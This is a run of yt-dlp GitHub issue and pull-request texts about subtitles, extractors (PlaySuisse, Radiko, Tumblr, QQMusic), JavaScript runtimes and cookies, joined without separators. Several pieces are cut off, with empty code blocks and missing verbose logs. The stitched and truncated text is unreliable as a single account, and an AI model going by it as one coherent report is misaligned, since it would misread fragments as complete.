While downloading episodes of a series from PlaySuisse, I noticed that the extractor already discovers multiple subtitle playlists per language, but yt-dlp currently collapses them into a single selectable subtitle language, making one dowloadable and the others, as far as I could tell, unreachable via normal CLI options.

This is not a DRM issue; all subtitle URLs are already available to the extractor.

# What happens

For some PlaySuisse episodes, listing subtitles reports--e.g.,

```
Language Formats
fr vtt, vtt
it vtt, vtt
de vtt, vtt
```

Dumping JSON metadata shows that this corresponds to two distinct HLS subtitle playlists per language, for example (Italian):

  ```
  ""subtitles"": {
    ""it"": [
      {
        ""url"": ""https://stipo2-vod-prod.akamaized.net/stipo.../index-f11.m3u8"",
        ""ext"": ""vtt"",
        ""protocol"": ""m3u8_native""
      },
      {
        ""url"": ""https://stipo2-vod-prod.akamaized.net/stipo.../index-f12.m3u8"",
        ""ext"": ""vtt"",
        ""protocol"": ""m3u8_native""
      }
    ],
    ""fr"": [
   ```

These are genuinely different subtitle tracks (different text content) visible in the PlaySuisse web player (at least, in many cases I see one I wish in the web player and another one downloaded).

However, yt-dlp currently

- selects only one subtitle track per language and

- provides no way to request the second track via sub-langs or all-subs.

# Expected / desired behavior

Expose multiple subtitle tracks per language as distinct subtitle IDs, so that users can explicitly select them.

For example, instead of keeping both tracks under a single language key (e.g., it: track1 + track2), emit different ""languages"" (e.g., it: track1, it-1: track2).

This would allow selecting both--e.g.,

```
yt-dlp --sub-langs it,it-1 --write-subs --embed-subs URL
```

No yt-dlp core changes are needed.

# Why this seems safe

- The extractor already has all necessary information (URLs, protocol, ext).

- This affects only PlaySuisse subtitles.

- Default behavior remains unchanged (users still get one subtitle, at random but this is so today, unless they explicitly ask for more).

- Similar language-suffix patterns are already used in other extractors, I am told from ChatGPT.

# Example URL (for testing)

https://www.playsuisse.ch/watch/4043540?episodeId=4072865

There should be six subtitles (two per national language) and there are only three (see run below).

Thanks for maintaining yt-dlp and playsuisse.py!

### Provide verbose output that clearly demonstrates the problem

- [x] Run **your** yt-dlp command with **-vU** flag added (`yt-dlp -vU <your command line>`)
- [ ] If using API, add `'verbose': True` to `YoutubeDL` params instead
- [x] Copy the WHOLE output (starting with `[debug] Command-line config`) and insert it below

It works for YouTube. 

yt-dlp https://youtube.com/channel/xxx/playlists/

This will download all available playlists!!!!!

But the same does NOT work for Rutube:

yt-dlp https://rutube.ru/channel/xxx/playlists/

The message is independent of the channel. So it's a general problem.

### Description of your *pull request* and other information

This PR does 2 things:
- Fix the thumbnail being set to a generated one instead of using the custom one provided by the creator
  - `defaultPreview` contains a generated thumbnail using a frame from the video
  - `preview` contains either an url in the format `https://images.boosty.to/image/{UUID}` for custom thumbnails or if none is set the same one as in `defaultPreview`
- Put the title of the post the media files belong to into the `alt_title` field
  - This is done because the title that is on the media files themselves is truncated to 64 chars by the API
  - I did not override the `title` field itself, because it may be different for posts with multiple media files (although it does not really seem to match to the files themselves in the one sample I do have)
    - `--parse-metadata ""alt_title:title""` can then be used if truncated titles are a problem

A few questions as this is my first contribution to yt-dlp:
- The old testcases were referencing posts that were deleted, so I yanked them and replaced them with a post I could find that was not behind a paywall via a search engine, but (at least on my machine) `hatch test` failed on youtube ejs extraction, but it worked when executed via CLI, so I am not really sure how to handle that
- I have no posts that could replace the playlist tests (that are not behind a paywall), what should I do about that?

### Please make sure the question is worded well enough to be understood

When I use yt-dlp api from python, yt-dlp failed to find deno even I specified the path.
```

```
```
[debug] JS runtimes: none
```
What can I do to fix this?

My environment:
```bash

(venv) $ which deno

```

### Provide verbose output that clearly demonstrates the problem

- [x] Run **your** yt-dlp command with **-vU** flag added (`yt-dlp -vU <your command line>`)

### Description of your *pull request* and other information

Looking for supported extractors with names having the word ""music"", I discovered QQMuic, which I never used before.

So I navigated to a random song page and passed that into `yt-dlp -F` to extract the available streams.  However, the URL that my browser was sent to `https://y.qq.com/n/ryqq_v2/songDetail/002QE4o71oJARc` didn't trigger `qqmusic.py` and instead went to the generic extractor.

I soon discovered that whilst the `/ryqq/` segment does get regex matches, the (probably) newer `/ryqq_v2/` did not get matched, so I got that fixed.

**This is a minor edit and not a definitive fix for other limitation of the QQMusic extractor.**

when using the `--paths` options to set the `home` and `temp` directories, if the `temp` directory is set to a `tmpfs` mounted filesystem (RAM drive, for example) at the end of the process, the cleanup of the temporary file is left behind with what appears to be a permissions error

### Provide verbose output that clearly demonstrates the problem

- [x] Run **your** yt-dlp command with **-vU** flag added (`yt-dlp -vU <your command line>`)
- [x] If using API, add `'verbose': True` to `YoutubeDL` params instead
- [x] Copy the WHOLE output (starting with `[debug] Command-line config`) and insert it below

"Add support for Deno PyPI package ### Checklist

- [x] I'm requesting a feature unrelated to a specific site
- [x] I've looked through the [README](https://github.com/yt-dlp/yt-dlp#readme)
- [x] I've verified that I have **updated yt-dlp to nightly or master** ([update instructions](https://github.com/yt-dlp/yt-dlp#update-channels))

### Provide a description that is worded well enough to be understood

Per https://github.com/denoland/deno/issues/31254 and https://github.com/denoland/deno/pull/31799 , Deno is now officially packaged and distributed on PyPI as a wheel.

I propose to add a `[deno]` optional dependency to `pyproject.toml` to install Deno, and corresponding code to `utils/_jsruntime.py` to try to locate this installation first. (The wheel includes a compiled executable much like the ones that yt-dlp already looks for, and provides a Python shim with a `find_deno_exe` function returning the path to that executable.)

The latter change also allows Deno manually installed in yt-dlp's environment to be used without needing to specify a path explicitly, overriding any system installation (for example, to use a different Deno version).

I have a PR waiting for this.

### Provide verbose output that clearly demonstrates the problem

- [ ] Run **your** yt-dlp command with **-vU** flag added (`yt-dlp -vU <your command line>`)
- [ ] If using API, add `'verbose': True` to `YoutubeDL` params instead
- [ ] Copy the WHOLE output (starting with `[debug] Command-line config`) and insert it below

_No response_

### Provide a description that is worded well enough to be understood

Spamming you with a new issue because the pinned issue on this topic is locked. Youtube downloads now fail with a freshly updated binary with this message:

```
WARNING: [youtube] No supported JavaScript runtime could be found. Only deno is enabled by default; to use another runtime add  --js-runtimes RUNTIME[:PATH]  to your command/config. YouTube extraction without a JS runtime has been deprecated, and some formats may be missing. See  https://github.com/yt-dlp/yt-dlp/wiki/EJS  for details on installing one
```
I read everything in the pinned issue and found no justification for why this is being dumped on the user to manage. If deno is now an external dependency for the central feature of the software, why is it not being bundled with the executable? I checked and it is MIT license so that shouldn't be the issue. The only explanation I found in the other thread is that it would be extra work to package it; well, it's even more work to make every user figure out how to sort this on their particular system, and manage any dependency issues that arise.

### Provide a description that is worded well enough to be understood



Hello everyone,
I would like to introduce a new solution to address cookie-related issues when using yt-dlp.

**Project repository:**
[https://github.com/user1121114685/yt_dlp_cookie](https://github.com/user1121114685/yt_dlp_cookie)

This project is modified and extended based on
[https://github.com/kairi003/Get-cookies.txt-LOCALLY](https://github.com/kairi003/Get-cookies.txt-LOCALLY)

## How It Works

1. **Download the source code** from the project repository.
   Then, in Chrome Extensions:

   * Enable **Developer mode**
   * Click **Load unpacked**
   * Select the `yt_dlp_cookie/src` directory as the extension

2. **Open the website** you want to download content from.
   Click the extension icon and press the **Copy Cmd** button.
   The complete yt-dlp command (including cookies) will be copied to your clipboard automatically.

3. **Paste the command** into the directory where `yt-dlp.exe` is located and execute it.
   The video will be downloaded immediately.

## Advantages

* Greatly simplifies the download workflow
* Eliminates manual cookie extraction and management
* Improves cookie security by avoiding file-based cookie exports
* Provides a more user-friendly and reliable solution

This plugin is an optimized and practical solution to the problem discussed in
[https://github.com/yt-dlp/yt-dlp/issues/7271](https://github.com/yt-dlp/yt-dlp/issues/7271)
and significantly improves both usability and security compared to traditional approaches.



### Provide verbose output that clearly demonstrates the problem

- [ ] Run **your** yt-dlp command with **-vU** flag added (`yt-dlp -vU <your command line>`)
- [ ] If using API, add `'verbose': True` to `YoutubeDL` params instead
- [ ] Copy the WHOLE output (starting with `[debug] Command-line config`) and insert it below

"[twitter] Set availability for Spaces extractor ### Description of your *pull request* and other information

This PR fixes an issue where Twitter Spaces were incorrectly skipped by
`--match-filter` conditions due to missing availability metadata.

The Twitter Spaces extractor now explicitly sets:

    availability = ""needs_auth""

This makes availability-based match-filters deterministic and aligns
the extractor with other authenticated Twitter content.

### Please make sure the question is worded well enough to be understood

## Description
**Problem:**
When using `yt-dlp` to download videos from quoted tweets on X.com (formerly Twitter), it fails to:
1. Retrieve videos from quoted tweets.
2. Capture both the displayed caption and the original tweet caption.

## Example

**URL:** [https://x.com/CoachDanGo/status/1998242901000908805](https://x.com/CoachDanGo/status/1998242901000908805)

- **Displayed caption (quoted text):**
```
I don't care what anyone says.

RFK is doing more pull-ups than the average 20-year-old.

At 71, this is impressive.
```

- **Original tweet caption:**
```
BREAKING: RFK Jr. smashes 20 pull-ups at the airport, at 71 years old.
```

## Expected Behavior
`yt-dlp` should provide **both the displayed caption and the original caption** when downloading quoted tweets.


## Environment
- `yt-dlp` version: latest
- Python version: 3.13
- OS: (ubuntu)


### Provide verbose output that clearly demonstrates the problem

- [ ] Run **your** yt-dlp command with **-vU** flag added (`yt-dlp -vU <your command line>`)
- [ ] If using API, add `'verbose': True` to `YoutubeDL` params instead
- [ ] Copy the WHOLE output (starting with `[debug] Command-line config`) and insert it below

### Provide a description that is worded well enough to be understood

When downloading YouTube livestream using `--live-from-start`, I noticed that sooner or later the download threads for A/V will crash due to 

```
ERROR: Did not get any data blocks
  File ""threading.py"", line 973, in _bootstrap
  File ""threading.py"", line 1016, in _bootstrap_inner
  File ""threading.py"", line 953, in run
  File ""concurrent\futures\thread.py"", line 83, in _worker
  File ""concurrent\futures\thread.py"", line 58, in run
  File ""yt_dlp\downloader\fragment.py"", line 490, in _download_fragment
  File ""yt_dlp\downloader\fragment.py"", line 462, in download_fragment
  File ""yt_dlp\downloader\fragment.py"", line 124, in _download_fragment
  File ""yt_dlp\downloader\common.py"", line 480, in download
  File ""yt_dlp\downloader\http.py"", line 363, in real_download
  File ""yt_dlp\downloader\http.py"", line 329, in download
  File ""yt_dlp\YoutubeDL.py"", line 1154, in report_error
  File ""yt_dlp\YoutubeDL.py"", line 1082, in trouble
```

And after both threads crashed, the download will stop and a broken, incomplete file is the result, for obvious reason.

This will not happen immediately but given the stream is longer enough (say, >1 hr), it will eventually happen in my 4 times using it lately.

Below is my current download where one of the DL thread already crashed （f140) but not the other (f137), yet.

### Provide verbose output that clearly demonstrates the problem

- [x] Run **your** yt-dlp command with **-vU** flag added (`yt-dlp -vU <your command line>`)
- [x] If using API, add `'verbose': True` to `YoutubeDL` params instead
- [x] Copy the WHOLE output (starting with `[debug] Command-line config`) and insert it below

### Provide a description that is worded well enough to be understood

`yt-dlp -f ""bv[vcodec='h264'],ba"" ""https://www.facebook.com/reel/1610774023228154""` downloads only the audio file instead of failing. My goal is for the following to succeed instead of downloading only audio:

`yt-dlp -f ""(bv[vcodec='h264'],ba)/(bv,ba)"" ""https://www.facebook.com/reel/1610774023228154""`

### Provide verbose output that clearly demonstrates the problem

- [x] Run **your** yt-dlp command with **-vU** flag added (`yt-dlp -vU <your command line>`)
- [ ] If using API, add `'verbose': True` to `YoutubeDL` params instead
- [x] Copy the WHOLE output (starting with `[debug] Command-line config`) and insert it below

### Region

Britain

### Provide a description that is worded well enough to be understood

Looks like TikTok changed something, and now yt-dlp isn't working properly anymore. FWIW, gallery-dl seems to be having the same issues.
General site support seems broken, but some things still work. Pagination seems fine, post IDs are found during simulation, but no data is being extracted.
I think it broke some around 10:15 CET, and then again around 15:35 CET.

### Provide verbose output that clearly demonstrates the problem

- [x] Run **your** yt-dlp command with **-vU** flag added (`yt-dlp -vU <your command line>`)
- [ ] If using API, add `'verbose': True` to `YoutubeDL` params instead
- [x] Copy the WHOLE output (starting with `[debug] Command-line config`) and insert it below

### Provide a description that is worded well enough to be understood

When attempting to download TikTok videos on Android using yt-dlp (via youtubedl-android library), the download fails with an impersonation warning followed by a ""Video not available, status code 0"" error.

The TikTok extractor attempts to use browser impersonation to bypass bot detection, but the required dependency (`curl_cffi`) is not available on Android platforms, causing all TikTok downloads to fail.

I faced two issues.

Second, I am unable to download videos from Tarang Plus. For example, while downloading [ichha-teaser-1](https://tarangplus.in/tarangaplus-originals/ichha/ichha-teaser-1) ,the process fails when fetching the M3U8 information and returns an HTTP 403 (Forbidden) error.

### Region

Global

### Provide a description that is worded well enough to be understood

Item 1 and 2 in the download playlist has the same link, which is the first video in page 1. The second download is skipped because video is already downloaded. Item 3 download the second video in page 1. The last video in page 1 is ignored because item 30 download the second last video in page 1.

The problem also affects videos in page 2 and next pages. Item 31 and 32 has the same link.

Also using video from user profile doesn't work:
https://xhamster.com/users/profiles/braninja/videos
I need to remove the 'profiles' for it to work:
https://xhamster.com/users/braninja/videos

yt-dlp.conf:
```
# output
-o ""d/%(extractor_key)s/[%(uploader)s] %(extractor_key)s/[%(uploader)s] %(extractor_key)s %(upload_date)s %(title)s.%(ext)s""
--windows-filenames
--trim-filenames 120
--concurrent-fragments 4
--no-overwrites
--write-subs
--write-auto-subs
--sub-langs en.*
```

### Provide verbose output that clearly demonstrates the problem

- [x] Run **your** yt-dlp command with **-vU** flag added (`yt-dlp -vU <your command line>`)
- [ ] If using API, add `'verbose': True` to `YoutubeDL` params instead
- [x] Copy the WHOLE output (starting with `[debug] Command-line config`) and insert it below

### Complete Verbose Output

"yt-dlp does not pick up the correct `mtime` to set? ### Checklist

- [x] I'm asking a question and **not** reporting a bug or requesting a feature
- [x] I've looked through the [README](https://github.com/yt-dlp/yt-dlp#readme)
- [x] I've verified that I have **updated yt-dlp to nightly or master** ([update instructions](https://github.com/yt-dlp/yt-dlp#update-channels))
- [x] I've searched [known issues](https://github.com/yt-dlp/yt-dlp/issues/3766), [the FAQ](https://github.com/yt-dlp/yt-dlp/wiki/FAQ), and the [bugtracker](https://github.com/yt-dlp/yt-dlp/issues?q=is%3Aissue%20-label%3Aspam%20%20) for similar questions **including closed ones**. DO NOT post duplicates
- [x] I've read the [policy against AI/LLM contributions](https://github.com/yt-dlp/yt-dlp/blob/master/CONTRIBUTING.md#automated-contributions-ai--llm-policy) and understand I may be blocked from the repository if it is violated

### Please make sure the question is worded well enough to be understood

There are a couple of places

* https://github.com/yt-dlp/yt-dlp/blob/08d78996831bd8e1e3c2592d740c3def00bbf548/yt_dlp/downloader/http.py#L347

That the file is set to the ""correct"" `mtime` (I assume originally it was on the ""upload date"", and then later also the HTTP header of LastModified was set for correctness).

However, nowadays, it seems to not effect.

I tried to debug myself - `-v` for maybe-exposing the selected times logic, and `-k` for ""perhaps ffmpeg merging is wrong"" - but I didn't immediately see anything.

... and I didn't open a bug, because _I suspect_ it is too premature 😅 

### Provide verbose output that clearly demonstrates the problem

- [ ] Run **your** yt-dlp command with **-vU** flag added (`yt-dlp -vU <your command line>`)
- [ ] If using API, add `'verbose': True` to `YoutubeDL` params instead
- [ ] Copy the WHOLE output (starting with `[debug] Command-line config`) and insert it below

### Complete Verbose Output

Hence, using `--no-download-archive` was immediately blocking further flag completion

"[radiko] Add support for timefree 30 <!--

    Due to the high volume of pull requests, it may be a while before your PR is reviewed.
    Please try to keep your pull request focused on a single bugfix or new feature.
    Pull requests with a vast scope and/or very large diff will take much longer to review.

### Description of your *pull request* and other information

This PR fixes the radiko extractor to properly support timefree downloads beyond the standard 7-day window by implementing support for radiko's ""timefree 30"" feature (premium service allowing 30-day playback).

**Changes made:**

1. **Fixed program lookup API endpoint**: Changed from the weekly program endpoint (`/v3/program/station/weekly/`) to the date-specific endpoint (`/program/v3/date/{broadcast_day}/station/`). This allows accurate program information retrieval for older broadcasts within the 30-day window.

2. **Added broadcast day calculation**: Implemented `_get_broadcast_day()` method that properly handles Radiko's broadcast day convention (broadcasts before 5:00 AM are considered part of the previous day).

3. **Updated `_find_program()` signature**: Changed parameter from `cursor` (integer timestamp) to `timestring` (string format `YYYYMMDDHHmmss`) to properly calculate the broadcast day and convert to timestamp internally.

4. **Fixed stream type parameter**: Changed playlist query parameter from `type=b` to `type=c`, which is required for timefree 30 playback.

cf:

- https://github.com/yt-dlp/yt-dlp/issues/11422#issuecomment-2452166625
- https://github.com/yt-dlp/yt-dlp/pull/11498#issuecomment-2493782013

These changes enable users with Radiko premium accounts (via cookies) to download archived programs from up to 30 days ago, not just the standard 7-day window.

I tested:

- pytest -Werror -m ""not download""
- Can download timefree 7-day
- Can download timefree 30-day
- Unfortunately, yt-dlp can't download radiko live with FFmpeg regardless whether this pull request was applied or not

### Description of your *pull request* and other information

* Changes the default YouTube thumbnail download to prioritize .jpg instead .webp.
* Adds extractor argument for YouTube to select preferred thumbnail extension with `--extractor-arg ""youtube:thumbnail_ext=<jpg,webp>""`

Fixes #11242

""Why isn't `--convert-thumbnails jpg` good enough?""
While this is a good feature, there are two things that make this a less-than-ideal solution. 

1. `--convert-thumbnails` is implemented is a generationally lossy way, meaning that the quality of the JPEG will be significantly lower than the WEBP that was used for conversion. I would honestly consider this an issue, and might open an issue about it, if it doesn't already exist. Below is a link to a page where you can compare the original WEBP thumbnail vs the JPEG after `--convert-thumbnails jpg` was used to convert it.
https://slow.pics/c/aQnmLXRO
A lot of the grain and fine detail has been reduced. From https://youtu.be/Rkbb-llcLrQ

2. YouTube's own JPEG's are higher quality than their WEBP's. Although the difference is not as drastic as when using `--convert-thumbnails jpg`, it can still be noticed if you look closely.
https://slow.pics/c/lKJZTO6z
In the thumbnail with a car, the reflections around the rear tire are more clear, and the overall texture on the tires (especially the front) is clearer. In the thumbnail about action movies, even more grain and fine detail is retained.
From https://youtu.be/Rkbb-llcLrQ and https://youtu.be/tMn5vpZofUE

### Please make sure the question is worded well enough to be understood

When using yt-dlp --list-formats on a YouTube video, I noticed that the available format list changes significantly depending on whether cookies are supplied.

Specifically, when cookies are provided, many DASH formats (separate video/audio streams) disappear, and only a limited set of HLS (m3u8) formats are shown.
Without cookies, the expected DASH video-only and audio-only formats are listed normally.

Is this behavior expected or intentional?
If so, could you clarify why providing cookies results in fewer visible formats?

### Provide verbose output that clearly demonstrates the problem

- [x] Run **your** yt-dlp command with **-vU** flag added (`yt-dlp -vU <your command line>`)
- [ ] If using API, add `'verbose': True` to `YoutubeDL` params instead
- [x] Copy the WHOLE output (starting with `[debug] Command-line config`) and insert it below

"Clarify failure when video streams are gated ## Fixes issue #15467 by Improving handling of login-required content
The issue is not a functional bug just a bug in error handling this fixes 
The code currently omits video stream information from __INITIAL_STATE__ unless a valid web_session cookie is present. In this case, metadata is still available, but video.media.stream is empty, causing the extractor to fail with a misleading No video formats found error.

This change adds detection for this condition and raises a login_required error when stream data is missing but video metadata exists. Extraction behavior is unchanged when streams are available.

    Due to the high volume of pull requests, it may be a while before your PR is reviewed.
    Please try to keep your pull request focused on a single bugfix or new feature.
    Pull requests with a vast scope and/or very large diff will take much longer to review.
    It is recommended for new contributors to stick to smaller pull requests, so you can receive much more immediate feedback as you familiarize yourself with the codebase.

    PLEASE AVOID FORCE-PUSHING after opening a PR, as it makes reviewing more difficult.

### Region

India

### Provide a description that is worded well enough to be understood

I dont know if it's a bug or any other thing. As usual, today afternoon I was downloading a web-series to store in my hdd. Then in a sudden ytdlp saying ---
`ERROR: [hotstar] 1260143362: API call was unsuccessful; please report this issue on  https://github.com/yt-dlp/yt-dlp/issues?q= , filling out the appropriate issue template. Confirm you are on the latest version using  yt-dlp -U`

I tried every way possible. Changed my cookie, logged into friends account then again changed the cookie, switched to nighty then master then again stable, nothing but the same happened again and again..

I have given the actual line of terminal code I was trying in the terminal..
`"".\yt-dlp.exe"" -F -vU ""%URL%"" %COOKIE_CMD%`
`"".\yt-dlp.exe"" -f -vU ""%%A"" -N 16 %COOKIE_CMD% -o ""%OUTDIR%\%PREFIX%-%%(language)s.%%(ext)s"" ""%URL%""`

COOKIE = cookie.txt
URL = https://www.hotstar.com/in/shows/kerala-crime-files-the-search-for-cpo-ambili-raju/1260141610/day-1-crime-scene/1260143362/watch
%%A = ID given in "".\yt-dlp.exe -F ""%URL%"" ""%COOKIE%"" ""

And one thing, I wasn't connected to VPN..

### Provide verbose output that clearly demonstrates the problem

- [x] Run **your** yt-dlp command with **-vU** flag added (`yt-dlp -vU <your command line>`)
- [ ] If using API, add `'verbose': True` to `YoutubeDL` params instead
- [x] Copy the WHOLE output (starting with `[debug] Command-line config`) and insert it below

"`--audio-multistreams` marks both streams as default ### Checklist

- [x] I'm asking a question and **not** reporting a bug or requesting a feature
- [x] I've looked through the [README](https://github.com/yt-dlp/yt-dlp#readme)
- [x] I've verified that I have **updated yt-dlp to nightly or master** ([update instructions](https://github.com/yt-dlp/yt-dlp#update-channels))
- [x] I've searched [known issues](https://github.com/yt-dlp/yt-dlp/issues/3766), [the FAQ](https://github.com/yt-dlp/yt-dlp/wiki/FAQ), and the [bugtracker](https://github.com/yt-dlp/yt-dlp/issues?q=is%3Aissue%20-label%3Aspam%20%20) for similar questions **including closed ones**.

### Please make sure the question is worded well enough to be understood

Downloading a multi-audio stream, marks both audio streams as `default` (see below).

Is that expected, or an error?

Should the first respective stream only be marked as default?
(e.g. for `137+140-0+140-1`, only `140-0` should be default)

I looked at https://github.com/yt-dlp/yt-dlp/issues?q=sort%3Aupdated-desc%20is%3Aissue%20--audio-multistreams

### Provide verbose output that clearly demonstrates the problem

- [ ] Run **your** yt-dlp command with **-vU** flag added (`yt-dlp -vU <your command line>`)
- [ ] If using API, add `'verbose': True` to `YoutubeDL` params instead

"[ie/tv5unis] Fix extractors ### Description of your *pull request* and other information

This pull request fixes the TV5Unis extractor. It removes `_WORKING = False` and tweaks the GraphQL query to include the URL of the m3u8 master playlist. The tests have been updated with videos currently available on TV5Unis.

Running `python -m unittest test/test_download.py -k TV5Unis` works fine, even outside of Canada.

> Ran 5 tests in 3.622s
> 
> OK

Fixes #12662

### Description of your *pull request* and other information

Some zoom recordings have the same link, except for the startTime=123.. at the end. The previous zoom extractor ignored this info, so it would download the wrong video when using a link with the startTime, so i just figured out how to fix that.

Fixes #


<details open>

- Added a startTime extractor

- Added the startTime to the links for INFO JSON downloads

### Region

Finland

### Provide a description that is worded well enough to be understood

Patreon now once again has feature where instead of just embedding YouTube or Vimeo, some creators can upload videos to platform itself. Currently it appears that yt-dlp cannot seem to find this video on page at all and just errors out with ""No supported media found in this post"". 

One example post I can find that has access without need for payments or accounts is: https://www.patreon.com/posts/scottfalco-146966245 

### Provide verbose output that clearly demonstrates the problem

- [x] Run **your** yt-dlp command with **-vU** flag added (`yt-dlp -vU <your command line>`)
- [ ] If using API, add `'verbose': True` to `YoutubeDL` params instead
- [x] Copy the WHOLE output (starting with `[debug] Command-line config`) and insert it below

When I run yt-dlp against a Reel on Facebook, sometimes I get this error message:

```

**Full `-vU` provided below.**

### The cause
If you use yt-dlp on Facebook Reels, depending on the video, it may grab the description of the video, then attempt to use that as the filename. That filename is too long and contains numerous characters that will cause issues on Windows. In turn, it will spit out _very_ helpful error messages like: `ERROR: unable to open for writing: [Errno 2] No such file or directory: `.

### Temporary workaround
Use something to limit the filename length until a fix has been applied to yt-dlp. Example:
`yt-dlp -o ""%(title).200s.%(ext)s"" YOUR-URL-HERE`
- You can also add -`-restrict-filenames` to the end to force the filename to use ASCII
- You can also add `--restrict-windows` to the end if you are on Windows

Previously I've been able to copy a share link from the xiaohongshu app and run `yt-dlp` with no extra parameters or options, however it appears that this functionality no longer works.

Using the `xhslink.com` link generated by the app (which supported was added in #11797) appears to be getting a 404 response from the server, however opening the link in the browser works, so it appears XHS is doing some server-side validation.

If I open the xhslink.com link in my browser it correctly redirects me to the page with the video that I wish to download. If I pass that URL (with all query parameters) into yt-dlp, it fails with a different error, the output from that command is provided in the section below.

### Provide verbose output that clearly demonstrates the problem

- [x] Run **your** yt-dlp command with **-vU** flag added (`yt-dlp -vU <your command line>`)
- [x] If using API, add `'verbose': True` to `YoutubeDL` params instead
- [x] Copy the WHOLE output (starting with `[debug] Command-line config`) and insert it below

### Please make sure the question is worded well enough to be understood

basically I have a music bot on discord, and i've been updating yt-dlp every week and now i need to use the new js runtimes, i've tried to fiddle around with it for a while but it hasn't been working. i installed node, deno, etc, and in the commandline it's working, but i just can't figure out how to add a runtime to my yt-dlp. i have node 22.14 installed, and i installed the yt-dlp-ejs package, but idk how to add it to this
`__YDL_OPTIONS = {'format': 'bestaudio/best',
                     'default_search': 'auto',
                     'playliststart': 0,
                     'limit_rate': '250K',
                     'rm_cache_dir': True,
                     'extract_flat': False,
                     'playlistend': config.MAX_PLAYLIST_LENGTH,
                     'quiet': True,
                     'nocheckcertificate': True,
                     'ignore_no_formats_error': True,
                     'cookies': './cookies.txt',
                     'http_headers': {
                         'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36',
                         'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                         'Accept-Language': 'en-US,en;q=0.9',
                         'Sec-Fetch-Mode': 'navigate',
                     },
                     }`

i tried to run the devscript but i couldn't figure out how it expected me to pass the arguments to it...

### Region

Worldwide

### Example URLs

Single video: https://www.croatian.film/en/films/77144/watch

### Provide a description that is worded well enough to be understood

Main page: https://www.croatian.film/
Film page: https://www.croatian.film/en/films/77144
Actual film stream pages examples:
https://www.croatian.film/en/films/77144/watch
https://www.croatian.film/hr/films/17939/watch
https://www.croatian.film/hr/films/23549/watch

The 'en' can be replaced by 'hr', this changes the language but the stream seems to be the same. Seems to accept only these two values. All films seem to be fetched by a 5 digit integer from 00001 to 77146 (at the moment).

The site uses Vimeo, not sure if that means it should go in the generic extractor. It gets the m3u8 and then gets mp4 segments.

A few potentially useful lines I found in dev tools:
https://vimeo.com/api/oembed.json?url=https%3A%2F%2Fvimeo.com%2F1105229510&id=1105229510&responsive=true&title=false&byline=false

### Description of your *pull request* and other information

Currently yt_dlp terminates with an error upon bigo.tv live streams when the user is not live at the moment of invocation, even if the wait_for_video parameter is given. This is due to the fact that an ExtractorError is raised in this situation, which therefore can be easily fixed by raising an UserNotLive exception instead.

### Description of your *pull request* and other information

Currently, the Tumblr InfoExtractor does not include an upload date / timestamp in the extracted info unless the post links to a page which is extracted using a different extractor (e.g. a tumblr post linking a YouTube video).  However, Tumblr posts do have timestamps.

This PR does its best to find and use the relevant timestamp for a posted video, and adds this information to the extracted information.

Some additional notes:
- I didn't open an issue for this PR, since it seems like a small change, and closer to a fix than a new feature.  I recognize that by not doing this step, I put my PR at risk of needing substantial changes, or being rejected outright as out-of-scope.  If this is the case, I understand, and I apologize.
- There's some variability an the presence of JSON-LD metadata that I don't understand.  It should be present on at least some posts, however, and works as an effective fallback for cases where an API key isn't used, so I've included it as a fallback anyway, since it shouldn't introduce any issues other than a warning in a small number of cases.
- I had some issue getting the tests to run (`hatch` didn't seem to love being run on Nix, among other things), so I ended up running tests using `python -m devscripts.run_tests -k Tumblr `.  I *think* this should be most of the relevant tests?  But please let me know if I missed any
- There's a bunch of tests which fail on the master branch for me (namely 10, 12, 13, 14, 15, and 6-9).  These seem to be mainly tests which apply to other embeded IEs.  I've not changed any of these tests in my PR, though it's possible that my code has caused additional breakages in these tests.  I'm not sure if the tests are broken because of something in my setup, or if they truely are broken.  In any case, please let me know how best to proceed here.

Thanks for the awesome tool and the opportunity to contribute!

"Sponsorblock-remove trims video but leaves audio ### Checklist

- [x] I'm reporting a bug unrelated to a specific site
- [x] I've verified that I have **updated yt-dlp to nightly or master** ([update instructions](https://github.com/yt-dlp/yt-dlp#update-channels))
- [x] I've searched [known issues](https://github.com/yt-dlp/yt-dlp/issues/3766), [the FAQ](https://github.com/yt-dlp/yt-dlp/wiki/FAQ), and the [bugtracker](https://github.com/yt-dlp/yt-dlp/issues?q=is%3Aissue%20-label%3Aspam%20%20) for similar issues **including closed ones**. DO NOT post duplicates
- [x] I've read the [policy against AI/LLM contributions](https://github.com/yt-dlp/yt-dlp/blob/master/CONTRIBUTING.md#automated-contributions-ai--llm-policy) and understand I may be blocked from the repository if it is violated

### Provide a description that is worded well enough to be understood

When using the argument sponsorblock-remove to remove segments, the video is trimmed correctly but the audio remains. Playing this back results in differing behaviour depending on the video player; VLC mostly handles it well, though the audio skips a bit, but MPC-BE pauses the video stream whilst the audio catches up, resulting in the segment not being skipped at all.

### Provide verbose output that clearly demonstrates the problem

- [x] Run **your** yt-dlp command with **-vU** flag added (`yt-dlp -vU <your command line>`)
- [ ] If using API, add `'verbose': True` to `YoutubeDL` params instead
- [x] Copy the WHOLE output (starting with `[debug] Command-line config`) and insert it below

### Complete Verbose Output

### Please make sure the question is worded well enough to be understood

I have a youtube premium account, but unless I can export videos out of my downloads feed directly into my pc (with best audio and video quality) on youtube, I want to use yt-dlp instead. I understand there's a risk of being banned; How many reports have there been on that so far?

I've got my cookies formatted under netscape in a file, and this is command I ran;

"[Bug] If the update check fails (-U), the entire download is flagged as failed ### Checklist

- [x] I'm reporting a bug unrelated to a specific site
- [x] I've verified that I have **updated yt-dlp to nightly or master** ([update instructions](https://github.com/yt-dlp/yt-dlp#update-channels))
- [x] I've searched [known issues](https://github.com/yt-dlp/yt-dlp/issues/3766), [the FAQ](https://github.com/yt-dlp/yt-dlp/wiki/FAQ), and the [bugtracker](https://github.com/yt-dlp/yt-dlp/issues?q=is%3Aissue%20-label%3Aspam%20%20) for similar issues **including closed ones**. DO NOT post duplicates
- [x] I've read the [policy against AI/LLM contributions](https://github.com/yt-dlp/yt-dlp/blob/master/CONTRIBUTING.md#automated-contributions-ai--llm-policy) and understand I may be blocked from the repository if it is violated

### Provide a description that is worded well enough to be understood

When the update check before downloading fails (e.g. because of the rate limit) and the real download part finishes successfully, the entire job is considered as failed, which is an issue for apps that use yt-dlp and this function to tell if the download failed or not, like YTDLnis (https://github.com/deniscerri/ytdlnis/issues/1043)

### Provide verbose output that clearly demonstrates the problem

